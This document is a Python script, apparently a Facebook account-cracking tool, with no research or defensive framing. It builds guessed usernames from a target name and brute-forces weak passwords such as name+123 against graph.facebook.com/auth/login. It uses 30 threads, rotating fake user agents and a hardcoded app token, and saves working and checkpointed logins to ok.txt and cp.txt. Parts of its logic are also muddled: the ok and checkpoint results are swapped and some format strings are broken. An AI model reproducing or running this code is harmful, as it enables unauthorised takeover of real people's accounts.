#coding utf-8
#code by kall dev
import os, sys, re, time, requests, calendar, random, bs4, uuid, json, subprocess
from concurrent.futures import ThreadPoolExecutor
from requests.exceptions import ConnectionError
from rich.panel import Panel
from rich.tree import Tree
from rich import print as prints

P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
Y = '\x1b[0m'    # WARNA MATI

M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
P2 = "[#FFFFFF]" # PUTIH

tampung,ugen,owner = [],[],"kalldev"
for i in range(2000):
      rr=random.randint
      ua1 = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randrange(90, 108)}.0.{random.randrange(4200, 4900)}.{random.randrange(40, 150)} Safari/537.36"
      ua2 = f"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randrange(90, 108)}.0.{random.randrange(4200, 4900)}.{random.randrange(40, 150)} Safari/537.36"
      ua3 = f"Mozilla/5.0 (Linux; U; Android {str(rr(2,8))}.{str(rr(0,4))}.{str(rr(0,7))}; es-la; LG-C729 Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 UCBrowser/{str(rr(1,20))}.{str(rr(1,10))}.{str(rr(0,10))}.{str(rr(111,5555))} U3/0.8.0 Mobile Safari/533.1"
      ua4 = "Mozilla/5.0 (Linux; Android {str(rr(2,8))}.{str(rr(0,2))}; SM-C7000 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(111,222))}.0.{str(rr(111,5555))}.{str(rr(111,555))} Mobile Safari/537.36 Instagram {str(rr(111,222))}.0.0.{str(rr(11,55))}.{str(rr(111,222))} Android (24/7.0; 420dpi; 1080x1920; samsung; SM-C7000; c7ltechn; qcom; uk_UA; 104766900)"
      ua = str(random.choice([ua1, ua2, ua3, ua4]))
      ugen.append(ua)

class gmail:
      
      def __init__(self):
            self.ok,self.cp,self.loop,self.die=[],[],0,0
            self.ses = requests.Session()
            self.test()
            
      def test(self):
            self.arara()
            respons = ['andi','dwi','muhammad','nur','dewi','tri','dian','sri','putri','eka','sari','aditya','jancok','budi','joni','toni','cahya','riski','farhan','aden','joko']
            respon = ['99','official','gaming','utama','123','1234','12345','123456','cakep','01', '02', '03', '04', '05', '06', '07', '08', '09','sayang']
            user3 = input('%s[%s>%s] Input Name Target : %s'%(P, H, P, Y))         
            user4 = input('%s[%s>%s] input jumlah target :%s '%(P, H, P, Y))
            responses = input('%s[%s>%s] Masukan Format : %s'%(P, H, P, Y))
            try:
                  for response in range(int(user4)):
                      response4 = str(random.choice([f'{user3}{str(response)}',f'{user3}{str(random.choice(respons))}',f'{user3}{str(random.choice(respon))}']))
                      if response4 in tampung:pass
                      else:
                            tampung.append(response4+responses+'<=>'+user3)
                  self.passwrd()
            except Exception as e:exit(e)
            
      def passwrd(self):
            print('\n%s• %shasil %scp %stersimpan di %scp.txt\n%s• %shasil %sok %stersimpan di %sok.txt%s\n'%(H, P, K, P, K, H, P, H, P, H, Y))
            with ThreadPoolExecutor(max_workers=30) as peler:
                  for idf in tampung:
                        uid,user = idf.split('<=>')[0], idf.split('<=>')[1].lower()
                        xxx = user.split(' ')[0]
                        if len(user) <=5:
                               if len(xxx) <=1 or len(xxx) <=2:pass 
                               else:
                                     pwd=[
                                          xxx+'321', 
                                          xxx+'123', 
                                          xxx+'1234', 
                                          xxx+'12345', 
                                          xxx+'123456',
                                          xxx+'01',xxx+'02',
                                          xxx+'03',xxx+'04',
                                          xxx+'05',xxx+'06',
                                          xxx+'07',xxx+'08'
                                   ]
                        else:
                              pwd=[
                                          user, 
                                          xxx+'321', 
                                          xxx+'123', 
                                          xxx+'1234', 
                                          xxx+'12345', 
                                          xxx+'123456',
                                          xxx+'01',xxx+'02',
                                          xxx+'03',xxx+'04',
                                          xxx+'05',xxx+'06',
                                          xxx+'07',xxx+'08'
                                   ]
                        peler.submit(self.method,uid,pwd)
            exit()
            
      def method(self, user, pas):
            sys.stdout.write(f"\r{P}{H}• Cracking {P}{len(tampung)} {Y}: {H}Ok -: {len(self.cp)}{Y} : {K}Cp -: {len(self.ok)}{Y} : {M}Die -: {self.die}{Y}")
            sys.stdout.flush()
            for pw in pas:
                  try:
                        ua = random.choice(ugen)
                        data = {"access_token": "438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28", "sdk_version": {random.randint(1,26)}, "email": user, "locale": "en_US", "password": pw, "sdk": "android", "generate_session_cookies": "1", "sig": "4f648f21fb58fcd2aa1c65f35f441ef5"}
                        head = {"Host": "graph.facebook.com", "x-fb-connection-bandwidth": str(random.randint(20000000, 30000000)), "x-fb-sim-hni": str(random.randint(20000, 40000)),"x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
                        xxxx = self.ses.post("https://graph.facebook.com/auth/login", params=data, headers=head, allow_redirects=False).json()
                        
                        if "session_key" in xxxx:
                              cp = Tree('\r\n%s[ %sCHECKPOINT %s]'%(P2, K2, P2),style="bold white")
                              cp.add('%s %s|%s'%(K2, user, pw),style="bold white").add('%s%s'%(K2, ua),style="bold white")
                              prints(cp)
                              self.ok.append(user)
                              with open('ok.txt','a') as x:
                                    x.write(user+'|'+pw+'\n')
                              break
                              
                        elif "www.facebook.com" in xxxx["error"]["message"]:
                              ok = Tree('\r\n%s[ %sSUKSES LOGIN %s]'%(P2, H2, P2),style="bold white")
                              ok.add('%s %s|%s'%(H2, user, pw),style="bold white").add('%s%s'%(H2, ua),style="bold white")
                              prints(ok)
                              self.cp.append(user)
                              with open('cp.txt','a') as x:
                                    x.write(user+'|'+pw+'\n')
                              break
                        else:continue 
                        
                  except Exception as e:print(e)
            self.die+=1
            
      def arara(self):
             if 'linux' in sys.platform.lower():
                   try:os.system('clear')
                   except:pass
gmail()